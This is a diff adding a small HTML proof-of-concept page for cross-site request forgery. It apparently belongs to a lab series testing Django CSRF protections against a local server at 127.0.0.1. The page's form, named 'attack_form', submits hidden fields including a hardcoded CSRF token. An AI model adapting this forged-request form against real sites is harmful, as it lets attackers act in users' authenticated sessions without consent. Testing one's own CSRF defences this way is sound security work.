@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple CSRF</title>
+</head>
+<body>
+    <form action="http://127.0.0.1:8000/security/csrf" method="post" name="attack_form">
+        <input type="hidden" name="csrfmiddlewaretoken" value="h9q9ot3zuFzKsQNcy1t5AQvvcMwEji27dLalZoVCkBrdzkg14dv8jxoMsNz2ljKs">
+        <input type="hidden" name="name" value="CSRF-Attack-Four-with-CSRF-TOKEN-NOT-EXEMPTED-Unsafe-POST-with-CSRF_TRUSTED_ORIGINS-set"/>
+        <button onclick="submitForm()"  type="submit">Submit</button>  
+    </form>
+    <script>
+        function submitForm(){
+            document.forms['attack_form'].submit();
+        }
+    </script>
+</body>
+</html>
